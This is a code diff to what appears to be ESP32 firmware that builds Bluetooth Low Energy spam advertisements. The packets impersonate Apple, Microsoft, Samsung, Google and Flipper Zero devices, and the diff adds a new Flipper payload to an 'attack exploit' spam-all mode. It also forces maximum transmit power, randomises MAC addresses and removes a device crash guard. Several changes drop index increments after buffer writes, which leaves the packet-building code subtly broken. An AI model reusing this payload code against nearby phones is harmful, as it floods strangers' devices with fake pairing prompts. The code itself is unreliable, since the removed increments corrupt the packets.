@@ -72,13 +72,9 @@ BLEAdvertisementData BLEModules::GetAdvertismentData(EBLEPayloadType type)
                 uint16_t model = pp_models[model_index].value;
                 uint8_t color = pp_models[model_index].colors[random(pp_models[model_index].colors_count)].value;
                 uint8_t prefix;
-                if(model == 0x0055 || model == 0x0030) prefix = 0x05;
+                if (model == 0x0055 || model == 0x0030) prefix = 0x05; // Airtag
                 else {
-                    if (espatsettings.useAppleJuicePaired) {
-                        prefix = 0x01;
-                    } else {
-                        prefix = 0x07;
-                    }
+                    espatsettings.useAppleJuicePaired ? prefix = 0x01 : prefix = 0x07;
                 }
                 AdvData_Raw[i++] = prefix; // Prefix (paired 0x01 new 0x07 airtag 0x05)
                 AdvData_Raw[i++] = (model >> 0x08) & 0xFF; // Device Model
@@ -90,7 +86,6 @@ BLEAdvertisementData BLEModules::GetAdvertismentData(EBLEPayloadType type)
                 AdvData_Raw[i++] = color; // Device Color
                 AdvData_Raw[i++] = 0x00;
                 esp_fill_random(&AdvData_Raw[i], 16);
-                i += 16;
                 AdvData.addData(AdvData_Raw, 31);
             } else if (randdevice == 1) {
                 AdvData_Raw = new uint8_t[11];
@@ -107,13 +102,12 @@ BLEAdvertisementData BLEModules::GetAdvertismentData(EBLEPayloadType type)
                 AdvData_Raw[i++] = flags;
                 AdvData_Raw[i++] = action;
                 esp_fill_random(&AdvData_Raw[i], 3);
-                i += 3;
                 AdvData.addData(AdvData_Raw, 11);
             }
             break;
         }
         case Microsoft: {
-            String Name = generateRandomName();
+            String Name = generateRandomString();
 
             uint8_t name_len = Name.length();
 
@@ -127,7 +121,6 @@ BLEAdvertisementData BLEModules::GetAdvertismentData(EBLEPayloadType type)
             AdvData_Raw[i++] = 0x00;
             AdvData_Raw[i++] = 0x80;
             memcpy(&AdvData_Raw[i], Name.c_str(), name_len);
-            i += name_len;
             AdvData.addData(AdvData_Raw, 7 + name_len);
             break;
         }
@@ -219,7 +212,7 @@ BLEAdvertisementData BLEModules::GetAdvertismentData(EBLEPayloadType type)
             String Name;
             if (espatsettings.useBleNameasnameofNameFlood)
                 Name = espatsettings.bleName;
-            else Name = generateRandomName();
+            else Name = generateRandomString();
             uint8_t name_len = Name.length();
 
             AdvData_Raw = new uint8_t[12 + name_len];
@@ -244,6 +237,52 @@ BLEAdvertisementData BLEModules::GetAdvertismentData(EBLEPayloadType type)
             AdvData.addData(AdvData_Raw, 12 + name_len);
             break;
         }
+        case Flipper: {
+            char Name[6];  // 5 characters + null terminator
+            generateRandomString(Name, sizeof(Name));
+
+            uint8_t name_len = strlen(Name);
+
+            // Allocate space for the full Advertisement Data section based on the hex dump
+            AdvData_Raw = new uint8_t[31];  // Adjusted to the specific length of the data in the dump
+
+            // Advertisement Data from the hex dump
+            AdvData_Raw[i++] = 0x02;  // Flags length
+            AdvData_Raw[i++] = 0x01;  // Flags type
+            AdvData_Raw[i++] = 0x06;  // Flags value
+
+            AdvData_Raw[i++] = 0x06;  // Name length (5 + type)
+            AdvData_Raw[i++] = 0x09;  // Complete Local Name type
+
+            // Add the randomized 5-letter name
+            memcpy(&AdvData_Raw[i], Name, name_len);
+            i += name_len;
+
+            AdvData_Raw[i++] = 0x03;  // Incomplete List of 16-bit Service UUIDs length
+            AdvData_Raw[i++] = 0x02;  // Incomplete List of 16-bit Service UUIDs type
+            AdvData_Raw[i++] = 0x80 + (rand() % 3) + 1;   // Service UUID (part of hex dump)
+            AdvData_Raw[i++] = 0x30;
+
+            AdvData_Raw[i++] = 0x02;  // TX Power level length
+            AdvData_Raw[i++] = 0x0A;  // TX Power level type
+            AdvData_Raw[i++] = 0x00;  // TX Power level value
+
+            // Manufacturer specific data based on your hex dump
+            AdvData_Raw[i++] = 0x05;  // Length of Manufacturer Specific Data section
+            AdvData_Raw[i++] = 0xFF;  // Manufacturer Specific Data type
+            AdvData_Raw[i++] = 0xBA;  // LSB of Manufacturer ID (Flipper Zero: 0x0FBA)
+            AdvData_Raw[i++] = 0x0F;  // MSB of Manufacturer ID
+
+            AdvData_Raw[i++] = 0x4C;  // Example data (remaining as in your dump)
+            AdvData_Raw[i++] = 0x75;
+            AdvData_Raw[i++] = 0x67;
+            AdvData_Raw[i++] = 0x26;
+            AdvData_Raw[i++] = 0xE1;
+            AdvData_Raw[i++] = 0x80;
+
+            AdvData.addData(AdvData_Raw, i);
+            break;
+        }
         default: {
             Serial.println("[WARN] Choose Company Type!");
             return AdvData; // Return empty data for default case
@@ -266,7 +305,7 @@ void BLEModules::main()
     NimBLEDevice::setScanFilterMode(CONFIG_BTDM_SCAN_DUPL_TYPE_DEVICE);
     NimBLEDevice::setScanDuplicateCacheSize(200);
     NimBLEDevice::init("");
-    //NimBLEDevice::setPower(MAX_TX_POWER);
+    NimBLEDevice::setPower(MAX_TX_POWER);
     pBLEScan = NimBLEDevice::getScan();
     ble_initialized = true;
     Serial.println("[INFO] Successfully Initialized BLE Module");
@@ -285,9 +324,7 @@ bool BLEModules::ShutdownBLE()
         }
         // Deinitialize BLE
         vTaskDelay(10 / portTICK_PERIOD_MS); // need delay to prevent crash
-        #ifndef BOARD_ESP32_C5_DEVKIT_C1 // Deinit cause crash on ESP32-C5 https://github.com/h2zero/NimBLE-Arduino/issues/1008
         NimBLEDevice::deinit();
-        #endif
         ble_initialized = false;
         Serial.println("[INFO] Shutting down BLE Module Successfully");
         return true;
@@ -334,6 +371,10 @@ void BLEModules::StartMode(BLEScanState mode) {
         executeSwiftpair(NameFlood);
         AdvertisedPacketCount++;
     }
+    else if (mode == BLE_ATTACK_EXPLOIT_FLIPPER) {
+        executeSwiftpair(Flipper);
+        AdvertisedPacketCount++;
+    }
     else if (mode == BLE_ATTACK_EXPLOIT_SPAM_ALL) {
         executeSwiftpair(SourApple, true);
         executeSwiftpair(AppleJuice, true);
@@ -341,6 +382,7 @@ void BLEModules::StartMode(BLEScanState mode) {
         executeSwiftpair(Samsung, true);
         executeSwiftpair(Google, true);
         executeSwiftpair(NameFlood, true);
+        executeSwiftpair(Flipper, true);
         AdvertisedPacketCount++;
     }
     else if (mode == BLE_ATTACK_SPOOFER_INIT)
@@ -500,23 +542,15 @@ void BLEModules::initSpoofer() {
         Serial.println("[INFO] BLE already initialized, skipping...");
         return;
     }
-    //uint8_t null_addr[6] = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
-    //setBleGapRandAddress(null_addr);
 
     Serial.println("[INFO] BLE Spoofer Initialized Successfully!");
 }
 
 void BLEModules::startSpoofer(uint8_t device_type, uint8_t device_brand, uint8_t conn_mode, uint8_t disc_mode) {
-    uint8_t dummy_addr[6] = {0x00};
-    for (int i = 0; i < 6; i++) {
-       dummy_addr[i] = random(256);
-        if (i == 0) dummy_addr[i] |= 0xC0; // Random non-resolvable
-    }
     if (!ble_initialized) {
         uint8_t macAddr[6];
         generateRandomMac(macAddr);
         setBaseMacAddress(macAddr);
-        //setBleGapRandAddress(dummy_addr);
         NimBLEDevice::init(espatsettings.bleName.c_str());
         NimBLEDevice::setPower(MAX_TX_POWER);
         NimBLEServer *pServer = NimBLEDevice::createServer();
@@ -538,31 +572,22 @@ void BLEModules::stopSpoofer() {
         vTaskDelay(50 / portTICK_PERIOD_MS); // Wait for advertisement to stop
         pAdvertising->stop();
         vTaskDelay(10 / portTICK_PERIOD_MS); // Wait for stop to complete
-        BLEDevice::deinit();
+        NimBLEDevice::deinit();
         ble_initialized = false;
     }
     Serial.println("[INFO] Stopping Spoofer Advertisement");
 }
 
 void BLEModules::initSpam() {
-    //uint8_t null_addr[6] = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
-    //setBleGapRandAddress(null_addr);
-
     ble_initialized = true;
     Serial.println("[INFO] BLE Spam Initialized Successfully!");
 }
 
 void BLEModules::executeSwiftpair(EBLEPayloadType type, bool forspamall)
 {
-    uint8_t dummy_addr[6] = {0x00};
-      for (int i = 0; i < 6; i++) {
-        dummy_addr[i] = random(256);
-        if (i == 0) dummy_addr[i] |= 0xC0; // Random non-resolvable
-    }
     uint8_t macAddr[6];
     generateRandomMac(macAddr);
     setBaseMacAddress(macAddr);
-    //setBleGapRandAddress(dummy_addr);
     NimBLEDevice::init("");
     NimBLEDevice::setPower(MAX_TX_POWER, NimBLETxPowerType::Advertise);
     NimBLEServer *pServer = NimBLEDevice::createServer();
@@ -594,7 +619,6 @@ class BLEScanDeviceCallbacks: public NimBLEScanCallbacks {
         extern BLEModules ble;
 
         if (!bleAnalyzerMode) {
-            bleScanRedraw = true;
             BLEScanResult bleres;
             String ble_name;
             ble_name = advertisedDevice->getName().c_str();
@@ -665,6 +689,11 @@ class BLEScanDeviceCallbacks: public NimBLEScanCallbacks {
                 bleres.flipperdata.variant = flippercolor;
             }
 
+            for (int i = 0; i < blescanres->size(); i++) {
+                if (blescanres->get(i).addr.equals(bleres.addr)) {
+                    return; // Already exists, ignore
+                }
+            }
             if (!low_memory_warning)
                 blescanres->add(bleres);
             String add_to_buffer;
@@ -673,6 +702,7 @@ class BLEScanDeviceCallbacks: public NimBLEScanCallbacks {
                 else add_to_buffer = ble_name;
             } else add_to_buffer = String("Low Mem! Ignore!");
             display_buffer->add(add_to_buffer);
+            bleScanRedraw = true;
 
             if (!low_memory_warning) {
                 if (match_airtag) Serial.println("[INFO] Added Airtag: " + bleres.name + " (Addr: " + String(bleres.addr.toString().c_str()) + ")" + " (RSSI: " + String(bleres.rssi) + ")" + " (Last Seen: " + String(bleres.airtagsdata.last_seen) + " ms)");
@@ -706,7 +736,7 @@ void BLEModules::bleScan() {
     if (!bleAnalyzerMode) {
         delete blescanres;
         blescanres = new LinkedList<BLEScanResult>();
-        pBLEScan->setScanCallbacks(new BLEScanDeviceCallbacks(), false);
+        pBLEScan->setScanCallbacks(new BLEScanDeviceCallbacks(), true);
     }
     else
         pBLEScan->setScanCallbacks(new BLEScanDeviceCallbacks(), true);
